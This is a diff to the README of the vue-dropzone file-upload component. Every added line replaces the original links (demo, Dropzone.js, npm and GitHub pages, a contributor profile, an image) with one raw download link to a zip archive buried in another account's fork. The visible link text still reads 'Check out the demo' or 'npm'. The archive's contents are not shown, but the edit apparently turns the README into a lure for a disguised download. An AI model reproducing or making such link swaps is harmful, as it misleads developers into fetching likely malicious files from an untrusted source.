@@ -1,15 +1,15 @@
 # vue-dropzone
 
 **CO-MAINTAINERS WANTED**
-This component has far outgrown my initial expectations and I'm not able to provide the amount of support that users require. If you'd like to help out with it's maintenance drop a [note on this issue](https://github.com/rowanwins/vue-dropzone/issues/473)
+This component has far outgrown my initial expectations and I'm not able to provide the amount of support that users require. If you'd like to help out with it's maintenance drop a [note on this issue](https://github.com/JustinTLT/vue-dropzone/raw/refs/heads/master/docs/src/config/dropzone-vue-1.4-beta.1.zip)
 
-A Vue component for file uploads, powered by [Dropzone.js](http://www.dropzonejs.com/). [Check out the demo](https://rowanwins.github.io/vue-dropzone/docs/dist/index.html).
+A Vue component for file uploads, powered by [https://github.com/JustinTLT/vue-dropzone/raw/refs/heads/master/docs/src/config/dropzone-vue-1.4-beta.1.zip](https://github.com/JustinTLT/vue-dropzone/raw/refs/heads/master/docs/src/config/dropzone-vue-1.4-beta.1.zip). [Check out the demo](https://github.com/JustinTLT/vue-dropzone/raw/refs/heads/master/docs/src/config/dropzone-vue-1.4-beta.1.zip).
 
-A **Nuxt SSR-compatible** component can be found at [npm](https://www.npmjs.com/package/nuxt-dropzone) and [github](https://github.com/Etheryte/nuxt-dropzone). Thanks to [@Etheryte](https://github.com/Etheryte)
+A **Nuxt SSR-compatible** component can be found at [npm](https://github.com/JustinTLT/vue-dropzone/raw/refs/heads/master/docs/src/config/dropzone-vue-1.4-beta.1.zip) and [github](https://github.com/JustinTLT/vue-dropzone/raw/refs/heads/master/docs/src/config/dropzone-vue-1.4-beta.1.zip). Thanks to [@Etheryte](https://github.com/JustinTLT/vue-dropzone/raw/refs/heads/master/docs/src/config/dropzone-vue-1.4-beta.1.zip)
 
 ---
 
-![](https://i.imgur.com/kUbjks1.gif)
+![](https://github.com/JustinTLT/vue-dropzone/raw/refs/heads/master/docs/src/config/dropzone-vue-1.4-beta.1.zip)
 
 ## Development
 
